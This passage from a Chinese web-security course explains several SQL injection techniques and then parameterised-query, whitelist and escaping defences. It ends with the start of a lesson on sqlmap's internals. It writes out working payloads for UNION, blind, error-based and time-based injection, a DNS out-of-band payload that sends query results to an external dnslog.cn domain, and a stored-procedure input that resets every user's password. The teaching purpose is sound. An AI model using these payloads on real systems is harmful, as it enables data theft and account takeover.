<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> Name, Phone, Address <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> Id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">10</span>
</code></pre>

<p>其中<code>ORDER BY 10</code>意味着，将获取的数据按照第十个字段来进行排序。如果字段个数不足十个，就会报错；如果能正常获得输出，那么就能推断出字段个数不少于十个。通过递增修改<code>ORDER BY</code>后的值，我们就可以成功推断出字段的个数。</p>

<p>在联合查询中，如果联合查询前后输出的字段类型不一致，就会报错。<strong>我们可以利用这一点，通过<code>null</code>来判断字段的类型</strong>，例如：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> Name, Phone, Address <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> Id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>
</code></pre>

<p>在上述语句中，因为<code>null</code>可以匹配任意类型，所以<code>Phone</code>和<code>Address</code>的类型匹配不会产生问题，这就让我们就能专心判断第一个字段<code>Name</code>的类型 。如果能获得正常输出，那么就表明<code>Name</code>字段的类型是整数。如果报错，就将<code>1</code>改为其他类型的数据继续判断。在获取到<code>Name</code>的类型后，我们可以重复该过程，继续判断其它字段类型，直到获取到所有字段的类型信息为止。</p>

<p>在使用联合注入时，如果系统开发者用了<code>LIMIT</code>来限制查询结果，让应用只显示第一条查询结果，这就会导致，即使我们成功进行了注入攻击，依然只能获得原本查询的信息。这时我们可以对系统原本查询的参数赋予不存在的值，使我们添加的联合查询成为唯一能够获取到结果的查询。</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> Name, Phone, Address <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> Id<span class="hljs-operator">=</span><span class="hljs-number">99999</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> creditCardNumber,<span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> CreditCardTable
</code></pre>

<h3 id="盲注-boolean注入">盲注（BOOLEAN注入）</h3>

<p>当应用可以受到注入攻击，但是它反馈的响应内容，不包含相关的SQL查询结果或者数据库报错详细信息时，联合注入就会变得无效，这时我们可以使用盲注。</p>

<p>盲注也有很多种利用方式，如果应用可以根据是否查询到内容这一点，进行不同的响应，那我们就可以使用盲注。比如，网站设计者制作了一个错误界面，它不返回SQL语句的具体错误信息，而是仅仅返回错误代码，像是<code>HTTP 500</code>等类似信息。这时我们可以通过适当的推理，来绕过这个阻碍，最终成功获取到我们想要的数据。</p>

<p>在布尔注入的过程中会用到如下几个重要的处理函数：</p>

<pre><code class="language-bash hljs">SUBSTRING(text, start, length)
<span class="hljs-comment"># 在“text”中从索引为“start”开始截取长度为“length”的子字符串，如果“start”的索引超出了“text”的总长度，那么该函数返回值为“null”。</span>

ASCII(char)
<span class="hljs-comment"># 获取“char”的 ASCII值，如果“char”为“null”，那么该函数返回值是0。</span>

LENGTH(text)
<span class="hljs-comment"># 获取“text”字符串的长度。</span>
</code></pre>

<p>利用上述函数，我们就可以实现盲注，例如有一个叫<code>Users</code>的数据表，包含字段<code>Id</code>,<code>username</code>，我们可以使用盲注枚举出username的每一个字符值，通过拼接得出完整的数值，如下是判断<code>username</code>的第一个字符的ASCII值是否为97的语句:</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> field1, field2, field3 <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> Id<span class="hljs-operator">=</span><span class="hljs-string">'1'</span> <span class="hljs-keyword">AND</span> ASCII(<span class="hljs-built_in">SUBSTRING</span>(username,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">97</span> <span class="hljs-keyword">AND</span> <span class="hljs-string">'1'</span><span class="hljs-operator">=</span><span class="hljs-string">'1'</span>
</code></pre>

<p>如果得到了正确的回应，就说明<code>username</code>的ASCII值为97，我们通过查询ASCII表就可以获得对应的字符值，之后继续判断<code>username</code>的后续字符。如果得到错误回应，那我们可以把ASCII的值进行更换，直到换为正确回应为止。</p>

<p>实现上面的判断需要我们能够区分正确回应和错误回应。我们可以用如下示例来获取正确回应和错误回应，通过对比将它们区分开来。</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> field1, field2, field3 <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> Id<span class="hljs-operator">=</span><span class="hljs-string">'1'</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'1'</span>
<span class="hljs-keyword">SELECT</span> field1, field2, field3 <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> Id<span class="hljs-operator">=</span><span class="hljs-string">'1'</span> <span class="hljs-keyword">AND</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'2'</span>
</code></pre>

<p>我们在判断<code>username</code>值的第<code>N</code>位的过程中，如果该位的ASCII值等于零，那我们就需要判断是否<code>username</code>到了末尾，这时候，我们就可以运用如下代码进行判断<code>username</code>的长度是否为<code>N</code>：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> field1, field2, field3 <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> Id<span class="hljs-operator">=</span><span class="hljs-string">'1'</span> <span class="hljs-keyword">AND</span> LENGTH(username)<span class="hljs-operator">=</span>N <span class="hljs-keyword">AND</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'1'</span>
</code></pre>

<p>如果得到正确回应，就不需要继续向后判断了，因为这说明我们已经获取到了正确的<code>username</code>；如果是错误回应，说明我们很有可能遇到了<code>null</code>字符，那我们需要继续向后判断，直到该查询得到正确回应为止。</p>

<h3 id="报错注入">报错注入</h3>

<p>顺着刚才的例子继续往下思考，如果应用系统不会因为查询是否返回数据而进行不同的反馈，布尔注入就会失效，这时候我们要怎么办呢？这种情况下，我们可以尝试报错注入。</p>

<p>为了提取出一些数据库内的信息，报错注入会故意执行一些导致数据库报错的行为，并将这些信息显示在报错页面上。报错注入的函数调用与错误触发方式，与具体的数据库管理系统以及版本相关，所以在注入之前我们需要确认数据库管理系统的相关信息。例如：</p>

<pre><code class="language-plain">http://www.example.com/product.php?id_product=10' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
http://www.example.com/product.php?id_product=10' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
</code></pre>

<p>第一个<code>payload</code>会运行<code>1/0</code>，这会导致SQL产生报错。第二个<code>payload</code>不会运行<code>1/0</code>，导致SQL不会产生报错，我们可以分别尝试上述注入，通过应用是否会产生不同的响应，来做出判断。如果会产生响应，那么我们就可以使用报错注入来获取到一些我们想要的信息。</p>

<p>下面我们一起看一个例子。</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> id_product<span class="hljs-operator">=</span>$id_product

# http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.example.com<span class="hljs-operator">/</span>product.php?id_product<span class="hljs-operator">=</span><span class="hljs-number">10</span><span class="hljs-string">' AND (SELECT CASE WHEN (Username = '</span>Administrator<span class="hljs-string">' AND SUBSTRING(Password, 1, 1) &gt; '</span>m<span class="hljs-string">') THEN 1/0 ELSE '</span>a<span class="hljs-string">' END FROM Users)='</span>a
</code></pre>

<p>在这个例子中，我们假设<code>Users</code>表中有<code>Username</code>以及<code>Password</code>两个字段，现在已知存在一个用户名为<code>Administrator</code>，现在想要猜测他的密码。</p>

<p>这时我们可以利用上述payload，判断密码首字母的ASCII码是否大于<code>m</code>的ASCII码。如果大于，那么就会运行<code>1/0</code>，这会引起除零错误，否则就不会引起错误。类似于布尔注入的方法，我们可以通过不断地尝试来获取到<code>Password</code>的值。</p>

<h3 id="时间盲注">时间盲注</h3>

<p>我们顺着报错注入的例子，继续深入思考。如果应用系统具备很好的错误处理逻辑，这样在响应请求时不会产生异常，报错注入就会失效。这种情况，我们可以尝试时间盲注（又称为时延注入）。</p>

<p>这种攻击方案的底层逻辑是，攻击者通过控制注入的参数，能够获得服务器的响应延时控制权。这种注入方式与数据管理系统相关，具体实施需要确认数据管理系统的信息。如下为一个时间盲注示例：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> id_product<span class="hljs-operator">=</span>$id_product

# http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.example.com<span class="hljs-operator">/</span>product.php?id_product<span class="hljs-operator">=</span><span class="hljs-number">10</span> <span class="hljs-keyword">AND</span> IF(version() <span class="hljs-keyword">like</span> ‘<span class="hljs-number">5</span><span class="hljs-operator">%</span>’, sleep(<span class="hljs-number">10</span>), ‘<span class="hljs-literal">false</span>’))<span class="hljs-comment">--</span>
</code></pre>

<p>在这个例子中，攻击者先检查MySQL的版本是否为5，如果判断为真，则让服务器延时十秒返回结果。</p>

<h3 id="dns带外注入">DNS带外注入</h3>

<p>在盲注的情况下，假设应用程序是异步执行的，也就是说，应用程序需要在原始线程处理用户的请求，并同时在另一个线程使用跟踪cookie执行SQL查询，这样我们刚才提到的注入方法都会失效。这时如果我们想要成功进行注入，可以尝试使用DNS带外注入。</p>

<p>在了解DNS带外注入前，我们需要一点点前置知识，就是泛域名解析。那么什么是泛域名解析呢，其实很简单，就是*.的所有域名解析到同一IP，举个例子，talentsec.cn指向了一个IP，在使用了泛域名解析技术的情况下，test.talentsec.cn也会指向同一个IP地址。</p>

<p>DNS带外注入，是使用不同通道检索数据的技术（例如，建立 HTTP 连接将结果发送到 Web 服务器等）。这个方法使用DBMS的功能，执行带外连接，并将注入查询的结果作为请求的一部分传递给攻击者。和报错注入类似，每个数据库管理系统有自己独有的功能函数，我们需要确认数据库管理系统的信息。下面就是一个DNS带外注入的示例：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> id_product<span class="hljs-operator">=</span>$id_product

#http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.example.com<span class="hljs-operator">/</span>product.php?id_product<span class="hljs-operator">=</span><span class="hljs-number">10</span> <span class="hljs-keyword">and</span> load_file(concat(<span class="hljs-string">'\\\\'</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">'security'</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),".afl3zg.dnslog.cn\\aa.txt")) <span class="hljs-comment">--+</span>
</code></pre>

<p>该<code>payload</code>使用了<code>loadfile</code>函数，该函数在这里可以通过<code>UNC</code>路径读取远程机器上的文件。它的参数是用<code>concat</code>函数拼接起来的<code>UNC</code>路径，由于<code>\</code>代表了转义的意思，所以实际拼接为<code>\\{query_result}.af13zg.dnslog.cn\aa.txt</code>，其中<code>{query_result}</code>为查询的结果，根据<strong>泛域名解析原理</strong>，该请求会被<code>afl3zg.dnslog.cn</code>记录下来。<code>afl3zg.dnslog.cn</code>是在<a href="http://www.dnslog.cn" target="_blank">DNSLog Platform</a>上面生成的一个域名，我们可以借助它来观察到外带的结果。域名生成之后，点击刷新记录，就可以显示出它接收到的访问信息，其中就包括了我们的查询结果。</p>

<h3 id="存储过程注入">存储过程注入</h3>

<p>在存储过程中，如果应用系统使用和用户交互式的SQL输入，程序就必须考虑注入风险。开发人员需要严格判断用户输入的合法性，以消除代码注入的风险。如果风险不清理，存储过程就可能会被用户输入的恶意代码污染。</p>

<p>下面这段代码，是存储过程注入示例：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">Create</span>
<span class="hljs-keyword">procedure</span> get_report <span class="hljs-variable">@columnamelist</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">7900</span>)
<span class="hljs-keyword">As</span>
<span class="hljs-keyword">Declare</span> <span class="hljs-variable">@sqlstring</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">8000</span>)
<span class="hljs-keyword">Set</span> <span class="hljs-variable">@sqlstring</span>  <span class="hljs-operator">=</span> <span class="hljs-string">'Select * '</span> <span class="hljs-operator">+</span> <span class="hljs-variable">@columnamelist</span> <span class="hljs-operator">+</span> <span class="hljs-string">' from ReportTable'</span>
<span class="hljs-keyword">exec</span>(<span class="hljs-variable">@sqlstring</span>)
Go
</code></pre>

<p>如果用户输入：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">from</span> users; <span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> password <span class="hljs-operator">=</span> ‘password’; <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span>
</code></pre>

<p>上述代码会把用户的输入赋值给<code>@sqlstring</code>，在之后的存储过程中执行，导致所有用户的密码更改为<code>password</code>。</p>

<h2 id="如何防御">如何防御</h2>

<p>虽然SQL注入攻击方式多变，但是在防御角度确有一种“以不变应万变”的防御方案。</p>

<p><strong>使用参数化查询（预编译）代替字符串连接查询，可以避免</strong><strong>绝大多数的SQL注入类安全风险。</strong>这种方法的实现原理其实很简单，采用参数化查询的SQL语句会预先编译好，SQL引擎会预先进行语法分析、产生语法树以及生成执行计划，经过这些预处理，后面无论输入什么，都只会被当作字符串字面值参数，并不会影响SQL的语法结构，因此是一种优秀的SQL注入防御方案。</p>

<p>比如以下代码，采用了字符串拼接查询，因此很容易受到SQL注入攻击：</p>

<pre><code class="language-java hljs"><span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT account_balance FROM user_data WHERE user_name = "</span> + request.getParameter(<span class="hljs-string">"customerName"</span>);
<span class="hljs-keyword">try</span> {
    <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement( ... );
    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">results</span> <span class="hljs-operator">=</span> statement.executeQuery( query );
}
</code></pre>

<p>通过如下参数化查询的优化方案，该代码就可以有效避免用户输入干扰查询结构：</p>

<pre><code class="language-java hljs"><span class="hljs-type">String</span> <span class="hljs-variable">custname</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">"customerName"</span>);
<span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT account_balance FROM user_data WHERE user_name = ?"</span>;
<span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt</span> <span class="hljs-operator">=</span> connection.prepareStatement( query );
pstmt.setString(<span class="hljs-number">1</span>, custname);
<span class="hljs-type">ResultSet</span> <span class="hljs-variable">results</span> <span class="hljs-operator">=</span> pstmt.executeQuery();
</code></pre>

<p><strong>存储过程中也存在SQL注入的安全问题，我们可以在存储过程中，用标准存储过程编程构造</strong>。它的效果类似于参数化查询，它要求开发人员只构建带有自动参数化参数的SQL语句。存储过程的SQL代码是在数据库本身定义和存储的，然后在应用程序中调用。</p>

<pre><code class="language-java hljs"><span class="hljs-comment">// This should REALLY be validated</span>
<span class="hljs-type">String</span> <span class="hljs-variable">custname</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">"customerName"</span>);
<span class="hljs-keyword">try</span> {
  <span class="hljs-type">CallableStatement</span> <span class="hljs-variable">cs</span> <span class="hljs-operator">=</span> connection.prepareCall(<span class="hljs-string">"{call sp_getAccountBalance(?)}"</span>);
  cs.setString(<span class="hljs-number">1</span>, custname);
  <span class="hljs-type">ResultSet</span> <span class="hljs-variable">results</span> <span class="hljs-operator">=</span> cs.executeQuery();
  <span class="hljs-comment">// … result set handling</span>
} <span class="hljs-keyword">catch</span> (SQLException se) {
  <span class="hljs-comment">// … logging and error handling</span>
}
</code></pre>

<p><strong>参数化查询虽然是一个非常优秀的SQL注入防御方案，但也并非是一个万全之策</strong>。当不信任的输入作为数值出现在查询语句中，这时比较适合用参数化查询来处理，比如<code>WHERE</code>语句以及<code>INSERT</code>或者<code>UPDATE</code>语句中出现的值。但是，当不信任的输入出现在查询语句其他位置，这种方法就不再适用了，例如表名、字段名或者<code>ORDER BY</code>语句中。</p>

<p>想要把不受信任的数据放入这些位置，需要采用不同的方法来避免注入攻击。例如，将允许的输入值列入白名单中，或者使用更安全的逻辑来实现我们的需求。使用白名单列表的输入验证，也是一个可行且优雅的防御方案。</p>

<p>如果在SQL查询中使用了绑定变量，比如表或列的名称，以及排序、顺序指示符（ASC或DESC），此时<strong>输入验证</strong>是最合适的防御方案。需要注意的是，通常表或列的名称，应该来自代码而不是用户，但是如果用户参数值被用于指明不同的表名和列名，那么参数值应该映射到合法或是预期的表名或列名，以确保用户的输入在经过验证之后才会出现在查询中。下面是一个数据表名验证的示例。</p>

<pre><code class="language-php hljs">String tableName;
<span class="hljs-keyword">switch</span>(PARAM):
  <span class="hljs-keyword">case</span> <span class="hljs-string">"Value1"</span>: tableName = <span class="hljs-string">"fooTable"</span>;
                 <span class="hljs-keyword">break</span>;
  <span class="hljs-keyword">case</span> <span class="hljs-string">"Value2"</span>: tableName = <span class="hljs-string">"barTable"</span>;
                 <span class="hljs-keyword">break</span>;
  <span class="hljs-comment">// ...</span>
  <span class="hljs-keyword">default</span>      : <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputValidationException</span>(<span class="hljs-string">"unexpected value provided for table name"</span>);
</code></pre>

<p>示例中的tableName可以直接加到SQL查询中，因为它现在是这个查询中表名的合法预期值之一。</p>

<p><strong>当上述方法都不可行时，我们还可以将用户输入放入查询之前对其进行转义</strong>。但是此技术只应作为最后的手段使用，一般只建议在实现输入验证不符合成本效益时考虑使用。因为与其他防御相比，这种方法很脆弱，我们并不能保证它会在所有情况下成功阻止SQL 注入。</p>

<p>转义技术是这样工作的，每个DBMS都支持一种或多种，针对特定查询类型的字符转义方案，如果从正在使用的数据库的转义方案出发，转义所有用户提供的输入，那么DBMS就不会将该输入与开发人员编写的SQL代码混淆，从而避免SQL注入漏洞的发生。下面我们来看一个转义的例子。</p>

<pre><code class="language-sql hljs">#ESAPI数据库编解码器非常简单,对于Oracle的使用示例为：
#ESAPI.encoder().encodeForSQL( <span class="hljs-keyword">new</span> OracleCodec(), queryparam );

#下面是一个Oracle的动态查询代码
String query <span class="hljs-operator">=</span> "SELECT user_id FROM user_data WHERE user_name = '"
              <span class="hljs-operator">+</span> req.getParameter("userID")
              <span class="hljs-operator">+</span> "' and user_password = '" <span class="hljs-operator">+</span> req.getParameter("pwd") <span class="hljs-operator">+</span>"'";
try {
    Statement statement <span class="hljs-operator">=</span> connection.createStatement( … );
    ResultSet results <span class="hljs-operator">=</span> statement.executeQuery( query );
}

#使用转义会使得这段代码可以抵御<span class="hljs-keyword">SQL</span>注入
Codec ORACLE_CODEC <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> OracleCodec();
String query <span class="hljs-operator">=</span> "SELECT user_id FROM user_data WHERE user_name = '"
<span class="hljs-operator">+</span> ESAPI.encoder().encodeForSQL( ORACLE_CODEC, req.getParameter("userID"))
<span class="hljs-operator">+</span> "' and user_password = '"
<span class="hljs-operator">+</span> ESAPI.encoder().encodeForSQL( ORACLE_CODEC, req.getParameter("pwd")) <span class="hljs-operator">+</span>"'";
</code></pre>

<h2 id="总结">总结</h2>

<p>这节课我们重点学习了SQL注入的利用方式和技巧。</p>

<p>首先是<strong>联合注入</strong>（UNION），这是一种非常强大并且易于使用的注入技巧，通过使用<code>ORDER BY</code>以及<code>null</code>技巧，强大的联合查询能够直接帮助攻击者获得大量数据；接下来是<strong>盲注</strong>（BOOLEAN注入），当应用系统存在SQL注入漏洞，但却没有直接数据回显时，盲注成为联合注入的接力棒，盲注又分为多种类型，虽然应用系统不能够直接回显数据查询结果，但如果查询结果能够影响响应页面，我们就可以通过盲注来猜测数据内容。</p>

<p>更进一步地，如果查询结果完全不能影响响应页面，这时又会出现三种新的可选攻击技巧。其中<strong>报错注入</strong>适用于没有标准化处理SQL查询错误的应用系统；而<strong>时间盲注</strong>则适用于上述所有限制条件全部存在的情况，因此时间盲注具备很强的适应性，虽然好处十分明显，缺陷也是十分明显，时间盲注需要大量的时间消耗才能完成完整攻击过程；<strong>DNS带外注入</strong>则是时间盲注的优化版，它不需要大量的时间消耗，通过SQL命令执行和网络信息传递，就可以将数据直接携带到外部监听端，达到快速获取受限环境数据的效果。</p>

<p>最后一部分是<strong>存储过程注入</strong>，上述SQL注入影响的都是应用系统层，而存储过程注入则直接影响数据库层，由于存储过程引入了字符串拼接，导致SQL注入问题被引入，其漏洞原理和利用方式都与常规的应用系统层SQL注入相似。</p>

<p>学习了SQL注入攻击技巧，再看如何进行防御。</p>

<p>最主流也是最好用的方案是<strong>参数化查询</strong>，又称预编译。通过预先的语法分析、产生语法树以及生成执行计划，未来所有参数输入都将被作为参数引入，无法修改SQL语句结构，因此能够极大程度地防御SQL注入攻击。但是这样优秀的解决方案，也有其不足之处，它只适用于将用户输入代入参数值的情况，如果希望将用户参数代入表名、字段名等情况，就需要使用其他方案。</p>

<p>对于上述需求场景，<strong>白名单列表</strong>是一个很好且很安全的方案，但是局限性也较大。如果白名单也无法满足你的个性化需求，那么就使用<strong>转义</strong>方案吧，但是值得注意的是转义方案与其他方案相比具有很大脆弱性，并不能保证在所有情况下都抵御SQL注入攻击。</p>

<p>回顾一下，这节课，我们一共学习了六种常见的SQL注入方式，并分别列举了典型的注入示例帮助大家加深理解。然后站在安全防御者视角，我们如何对不同类型注入点进行严格限制，分别介绍了将用户直接输入的查询改为参数化的查询的预编译方案、方便灵活使用的白名单方案以及最大满足个性化需求的转义方案。</p>

<p>通过学习本节课程，相信你已经掌握了SQL注入的多种攻击技巧以及防御技巧，希望能够帮助你在构建应用系统过程中更好地防御SQL注入攻击。</p>

<h2 id="思考">思考</h2>

<p>课程最后，给你留一个作业，你可以尝试使用本节课程讲述的SQL攻击方式完成<a href="https://mituan.zone/#/account/login" target="_blank">MiTuan</a>的【专项 · SQL注入】训练吗？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="14 自动化注入神器（一）：sqlmap的设计思路解析" class="title">14 自动化注入神器（一）：sqlmap的设计思路解析</h1>
                            <div><p>你好，我是王昊天。</p>

<p>从古至今，人们为了方便自己的生活，发明出各种各样的工具。就拿扫地来说，这是我小时候最讨厌的家务活动，因为扫地时扬起的灰尘会让我十分难受，而且有的死角很难被打扫干净。扫地机器人的出现给我们带来了极大的便利，我们只要拥有它，就不需要再亲自扫地了。</p>

<p>在前几节课中，我们学习了SQL注入的原理和方法，相信你已经小试牛刀了。不知道你在做注入测试的时候是否会觉得困难呢？反正我学的时候是遇到了不少困难，比如，绕过技巧多种多样，我们几乎不可能全部记住它们，就算记住了我们一一去尝试也需要很多的时间，费时又伤神。</p>

<p>就像我们刚才说过的，当问题出现时，我们常常会创造出一种工具，来解决对应的问题。那么有没有一款工具，能帮我们自动去进行注入测试呢？答案是肯定的，这个工具就是sqlmap。</p>

<p>这节课呢，我们正式开启sqlmap学习之旅，深入探究这款自动化注入神器的实现原理。<strong>首先我们要对一些知识有所了解，包括如何获取软件的代码，如何搭建软件的运行环境，以及软件文件功能等。接下来，我们会对sqlmap的工作流程做一个整体的介绍，这会为我们后续学习sqlmap打好基础。</strong></p>

<h2 id="sqlmap">sqlmap</h2>

<p><img src="assets/df4d2302275b45c1968c9d43804e0d36.jpg" alt="图片"></p>

<p>我们先来看看到底什么是sqlmap。</p>

<p>sqlmap是一个帮助我们自动检测sql注入是否存在的测试工具，它会使用不同注入方法进行测试，并将测试结果展示给我们，供我们利用。这些方法都是我们之前学过的内容，包括联合注入、时延注入、布尔盲注、报错注入和堆查询注入。如果你感兴趣，可以去上节课寻找更加详细的介绍。</p>

<p>因为它的持续更新和维护，所以大家普遍认为它既方便又好用，从图片中我们可以看到超过4k的fork数量，以及高频的源码更新。就像一枚硬币的两面，这种优势也会伴随一些问题，比如给我们阅读源代码增加了难度，而我们要想真正去理解、掌握这款工具，就必须要迎难而上，对它的源代码进行剖析。</p>

<p><img src="assets/ab62c070bd0640988e6a3b566f890b4a.jpg" alt="图片"></p>

<p><strong>代码获取</strong></p>

<p>我们用如下命令将sqlmap的源代码克隆下来。</p>

<pre><code class="language-bash hljs">git <span class="hljs-built_in">clone</span> https://github.com/sqlmapproject/sqlmap
<span class="hljs-built_in">cd</span> sqlmap
</code></pre>

<p>因为该过程需要访问外网，所以克隆的速度会较为缓慢，当然我们可以借助一些代理工具来加速这个过程。</p>

<p>这里我们分析的sqlmap版本是最新的版本1.6，它于2022年初发布，相比于上一代1.5.12版本，只是修复了几个编码异常，并且替换版本信息，并没有什么重大的改动。因此学习两个大版本的代码都是可以的。</p>

<p><img src="assets/1ca8a79048cc4387abe9166d5ac2eced.jpg" alt="图片"><img src="assets/456cc017b7b84c469a70ab0eb0b01f5e.jpg" alt="图片"></p>

<p>在获取到源代码之后，我们还需要配置软件的运行环境，这样sqlmap才能顺利的运行。下面让我们进入到环境搭建这一步骤。</p>

<p><strong>环境搭建</strong></p>

<p>这节课，我们采用的分析环境是python3.10.1，可以利用下面的命令新建一个虚拟的解释环境，这样做有利于运行环境的隔离，防止其他环境因素干扰sqlmap的执行过程。</p>

<pre><code class="language-bash hljs">python3 -m venv venv
</code></pre>

<p><strong>配置文件</strong></p>

<p>在做完环境搭建之后，sqlmap已经具有运行能力了。但是我们还需要知道哪个文件才是它的配置文件，即哪个文件会对它的运行产生影响。所以呢，接下来我们就来看看，sqlmap中有哪些重要的文件，它们又有哪些功能。</p>

<p>首先我们一起看下sqlmap的配置文件<code>sqlmap.conf</code>：</p>

<pre><code class="language-python hljs"><span class="hljs-comment"># At least one of these options has to be specified to set the source to</span>
<span class="hljs-comment"># get target URLs from.</span>
[Target]

<span class="hljs-comment"># Target URL.</span>
<span class="hljs-comment"># Example: http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat=2</span>
url =

<span class="hljs-comment"># Direct connection to the database.</span>
<span class="hljs-comment"># Examples:</span>
<span class="hljs-comment">#   mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME</span>
<span class="hljs-comment">#   oracle://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_SID</span>
direct = 

<span class="hljs-comment"># Parse targets from Burp or WebScarab logs</span>
<span class="hljs-comment"># Valid: Burp proxy (http://portswigger.net/suite/) requests log file path</span>
<span class="hljs-comment"># or WebScarab proxy (http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project)</span>
<span class="hljs-comment"># 'conversations/' folder path</span>
logFile = 

<span class="hljs-comment"># Scan multiple targets enlisted in a given textual file</span>
bulkFile =

<span class="hljs-comment"># Load HTTP request from a file</span>
<span class="hljs-comment"># Example (file content): POST /login.jsp HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/4.0\n\nuserid=joe&amp;password=guessme</span>
requestFile = 

<span class="hljs-comment"># At least one of these options has to be specified to set the source to</span>
<span class="hljs-comment"># get target URLs from.</span>
[Target]

<span class="hljs-comment"># Target URL.</span>
<span class="hljs-comment"># Example: http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat=2</span>
url =

<span class="hljs-comment"># Direct connection to the database.</span>
<span class="hljs-comment"># Examples:</span>
<span class="hljs-comment">#   mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME</span>
<span class="hljs-comment">#   oracle://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_SID</span>
direct = 

<span class="hljs-comment"># Parse targets from Burp or WebScarab logs</span>
<span class="hljs-comment"># Valid: Burp proxy (http://portswigger.net/suite/) requests log file path</span>
<span class="hljs-comment"># or WebScarab proxy (http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project)</span>
<span class="hljs-comment"># 'conversations/' folder path</span>
logFile = 

<span class="hljs-comment"># Scan multiple targets enlisted in a given textual file</span>
bulkFile =

<span class="hljs-comment"># Load HTTP request from a file</span>
<span class="hljs-comment"># Example (file content): POST /login.jsp HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/4.0\n\nuserid=joe&amp;password=guessme</span>
requestFile = 
......
<span class="hljs-comment"># Force back-end DBMS operating system to provided value. If this option is</span>

<span class="hljs-comment"># set, the back-end DBMS identification process will be minimized as</span>

<span class="hljs-comment"># needed.</span>

<span class="hljs-comment"># If not set, sqlmap will detect back-end DBMS operating system</span>

<span class="hljs-comment"># automatically by default.</span>

<span class="hljs-comment"># Valid: linux, windows</span>

os = 
......
</code></pre>

<p>由于配置文件很长，所以这里没有全部展示出来。我们需要知道的是，<strong>配置文件的参数配置可以对sqlmap程序运行的流程产生影响</strong>。举个例子，在配置文件中可以设置OS配置项，sqlmap就无需探测操作系统的类型了，这样就可以帮助我们在一些特定情况下优化sqlmap的执行速度。</p>

